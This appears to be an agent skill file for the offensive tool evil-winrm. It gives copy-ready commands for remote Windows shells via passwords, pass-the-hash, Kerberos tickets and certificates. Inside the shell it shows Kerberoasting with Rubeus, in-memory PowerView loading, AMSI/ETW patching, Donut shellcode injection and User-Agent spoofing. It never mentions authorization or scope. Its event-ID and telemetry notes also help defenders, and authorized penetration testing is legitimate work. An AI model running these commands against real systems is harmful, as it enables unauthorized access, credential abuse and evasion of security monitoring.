---
name: evil-winrm
description: "Open interactive WinRM shells with evil-winrm using passwords, NT hashes, certificates or Kerberos tickets, and load scripts and assemblies in memory. Use when 5985/5986 is open and you hold a valid account. Not for SMB-only hosts (use impacket wmiexec or psexec) or bulk spraying (use netexec)."
---

# evil-winrm

evil-winrm is a Ruby WinRM client with the rough edges filed off for offensive use. It gives you an interactive PowerShell session, upload and download, in-memory loading of PowerShell scripts and .NET assemblies, and authentication by password, NT hash, client certificate or Kerberos ticket. Because it speaks WinRM, it needs no service creation, no scheduled task and no SMB write, so it leaves a different and often smaller artefact trail than `psexec.py`.

This host runs **evil-winrm v4.1** from the Ruby gem at `/usr/local/bin/evil-winrm`.

## When to use

| Goal | Flags | Note |
| --- | --- | --- |
| Interactive shell with a password | `-i -u -p` | the default path |
| Pass-the-hash shell | `-i -u -H` | NT hash only, no LM part |
| Kerberos with a ccache | `-i -r -K` | FQDN required, not IP |
| Certificate authentication | `-i -S -c -k` | `-S` is mandatory, else certs are ignored |
| Non-default WinRM port | `-P 5986` | `-S` alone already switches the default to 5986 |
| Load a PowerShell toolkit | `-s ./scripts` | then type the script name |
| Run a .NET assembly in memory | `-e ./bins` | then `Invoke-Binary tool.exe` |
| Upload a file | `upload` | `upload <local> <remote>` inside the shell |
| Download a file | `download` | `download <remote> <local>` inside the shell |

## Prerequisites

- WinRM listening: 5985 (HTTP) or 5986 (HTTPS). Confirm with `nmap -p5985,5986` or `nxc winrm`.
- The account must be in `Remote Management Users`, `Administrators`, or hold an explicit WinRM permission. Domain Admin is not automatically enough on hardened hosts.
- NTLM must be enabled on the service for hash and password auth; Kerberos-only estates need `-r` plus `-K`.
- For Kerberos, `/etc/krb5.conf` must define the realm and the host must be addressed by FQDN. `-r CORP.LOCAL` sets the realm for the client, not for DNS.
- Certificate auth needs the server to trust the client cert's issuer and `-S` to be set.

## Core invocations

```sh
# 1. plain password shell
evil-winrm -i 10.10.10.5 -u alice -p 'Winter2026!'

# 2. pass-the-hash
evil-winrm -i 10.10.10.5 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# 3. local account on a workgroup box: prefix the user with the hostname
evil-winrm -i 10.10.10.5 -u 'WS01\localadmin' -p 'P@ssw0rd'

# 4. Kerberos with a ccache from getTGT.py, over TLS on 5986
evil-winrm -i dc01.corp.local -r CORP.LOCAL -K /tmp/alice.ccache -S

# 5. certificate authentication: both files plus TLS
evil-winrm -i 10.10.10.5 -S -c ./alice.crt -k ./alice.key

# 6. alternate port, and a non-default WinRM endpoint path
evil-winrm -i 10.10.10.5 -u alice -p 'Winter2026!' -P 5986 -S
evil-winrm -i 10.10.10.5 -u alice -p 'Winter2026!' -U '/wsman'

# 7. load a toolkit directory and a binaries directory at startup
evil-winrm -i 10.10.10.5 -u alice -p 'Winter2026!' -s ./scripts -e ./bins

# 8. evasive client settings and a local transcript
evil-winrm -i 10.10.10.5 -u alice -p 'Winter2026!' -a 'Mozilla/5.0' -l -n

# 9. force Kerberos SPN prefix when the service is registered oddly
evil-winrm -i files01.corp.local -r CORP.LOCAL -K /tmp/alice.ccache --spn HTTP -S
```

Inside the shell:

```text
# 10. drop and pull files
upload /opt/tools/Rubeus.exe C:\ProgramData\Rubeus.exe
download C:\Users\alice\Desktop\notes.txt ./notes.txt

# 11. run a .NET assembly from the -e directory, in memory
Invoke-Binary Rubeus.exe kerberoast /outfile:C:\ProgramData\k.txt

# 12. load a .ps1 from the -s directory without touching disk
PowerView.ps1

# 13. list interesting services and whether you can query them
services

# 14. patch AMSI and ETW, then load the built-in menu
Bypass-4MSI
menu

# 15. run shellcode through Donut in a chosen process
Donut-Loader -process_id 1234 -donutfile /opt/tools/payload.bin
```

## Flags that matter

| Flag | Effect | Note |
| --- | --- | --- |
| `-i` | target IP or FQDN | required; FQDN when using Kerberos |
| `-u` / `-p` | username / password | omit both only on the Kerberos or cert path |
| `-H` | NT hash | bare NT hash, 32 hex characters |
| `-S` | enable TLS | also flips the default port to 5986 |
| `-c` / `-k` | client certificate / private key | ignored with a warning unless `-S` is set |
| `-r` | Kerberos realm | must match `/etc/krb5.conf` |
| `-K` | ticket file | ccache or kirbi, auto-detected |
| `--spn` | SPN prefix | default `HTTP`; change for odd registrations |
| `-P` | remote port | default 5985, or 5986 with `-S` |
| `-U` | WinRM endpoint path | default `/wsman` |
| `-s` | directory of `.ps1` files | scripts are base64-chunked and executed with IEX in memory |
| `-e` | directory of .NET assemblies | enables `Invoke-Binary` |
| `-a` | User-Agent string | default claims to be the Microsoft WinRM client |
| `-l` | log the session locally | writes a log file next to you |
| `-n` | disable colours | useful for clean transcripts |
| `-N` | disable remote path completion | avoids extra round trips |
| `-V` | version | prints `v4.1` |

## Workflow

1. **Confirm the service first.** `nxc winrm host -u u -p p` costs one authentication and tells you whether the account is permitted, before you wrestle with an interactive client.
2. **Pick the credential form you already have.** Password, then hash, then ccache, then certificate. Each step up is quieter than re-obtaining a password.
3. **Load from a directory, not from the shell.** `-s ./scripts` and `-e ./bins` keeps commands short and keeps payloads off the target's disk.
4. **Enumerate before you act.** `whoami /priv`, `whoami /groups`, `Get-LocalGroupMember Administrators`, and `services` are cheap and non-destructive.
5. **Choose execution that matches the goal.** `Invoke-Binary` for .NET tooling, `Donut-Loader` for shellcode, plain PowerShell for collection.
6. **Pull evidence out with `download`.** Do not leave loot on the host.
7. **Exit cleanly and check the transcript.** `-l` gives you a record, and the WinRM log on the target gives the other side of it.

## OPSEC and telemetry

- Each connection is a network logon: Security 4624 type 3 on the target, with `Authentication Package: NTLM` (or Kerberos) and a logon originating from `wsmprovhost.exe`. A 4625 precedes it if the first attempt failed.
- WinRM itself logs to `Microsoft-Windows-WinRM/Operational`: event 91 for an incoming request and event 168 for the authenticated user, which name your account and source address.
- Every command runs under `wsmprovhost.exe`; process creation is 4688 with that parentage, which is one of the cleanest WinRM detections.
- In-memory script loading via `-s` still produces PowerShell engine telemetry. With Script Block Logging enabled, the decoded script lands in 4104; Module Logging adds 4103. `Bypass-4MSI` patches AMSI in the current process only, so it does not stop 4104.
- `Invoke-Binary` and `Donut-Loader` run inside the same `wsmprovhost.exe` process; Defender may still flag the assembly content or the injection target (event 1116/1117 in `Microsoft-Windows-Windows Defender/Operational`).
- `upload` writes a real file over the WinRM file-transfer extension, which lands in 5145 if object-access auditing on the share path is on.
- Kerberos authentication avoids NTLM relay exposure and produces 4768/4769 on the DC rather than 4776.
- Rate matters: WinRM is slow by design, so a burst of hundreds of connections from one host stands out more than the same work over SMB.

## Failure modes

| Symptom | Cause | Fix |
| --- | --- | --- |
| `Connection refused` or `No such file or directory - connect(2)` | WinRM not listening, or wrong port | try 5986 with `-S`; verify with `nxc winrm` |
| `401 Unauthorized` | bad credential, or account not in Remote Management Users | check group membership; try the hash form |
| `WinRM::WinRMHTTPTransportError ... (500)` | Negotiate or SPN problem, common on Kerberos-only hosts | use `-r` with the FQDN, or fall back to NTLM |
| `OpenSSL::SSL::SSLError` | TLS on a plaintext port, or self-signed mismatch | drop `-S`, or keep `-S` and use 5986 |
| `Useless cert/s provided, SSL is not enabled` | `-c`/`-k` without `-S` | add `-S` |
| Kerberos auth loops or fails instantly | realm mismatch or IP used instead of FQDN | fix `/etc/krb5.conf`, pass `-r`, use the hostname |
| `upload` fails on a large file | transfer chunk or quota limits | split the file, or stage it over SMB |
| `Invoke-Binary` prints nothing | not a .NET assembly, or blocked at load | use `Donut-Loader`, or run a native binary via a staged file |
| Shell opens but commands return no output | output encoding or a broken `cmd.exe` path | set `$OutputEncoding`, try `-n`, run `powershell -c` explicitly |
| `-K` ticket rejected | clock skew, or ticket for another SPN | sync time; check `--spn` and the target FQDN |

## Verification

```sh
evil-winrm -V                       # v4.1
evil-winrm -h | head -5             # usage banner
which evil-winrm                    # /usr/local/bin/evil-winrm
```

Expected: `v4.1` and a usage block listing `-i`, `-u`, `-p`, `-H`, `-P`, `-S`, `-c`, `-k`, `-r`, `-K`, `-s`, `-e`. A working session prints the ASCII banner and a `*Evil-WinRM* PS C:\Users\...>` prompt. Keep the command line, the WinRM transcript from `-l`, and the target's WinRM operational log slice as evidence.

## Related skills

- [netexec](../netexec/SKILL.md) to validate the credential and check WinRM access before opening a shell
- [impacket](../impacket/SKILL.md) for hosts with SMB but no WinRM, and for the ticket you feed to `-K`
- [certipy](../certipy/SKILL.md) when the certificate used with `-c`/`-k` came from AD CS
- [enum4linux-ng](../enum4linux-ng/SKILL.md) to find the account names you will try here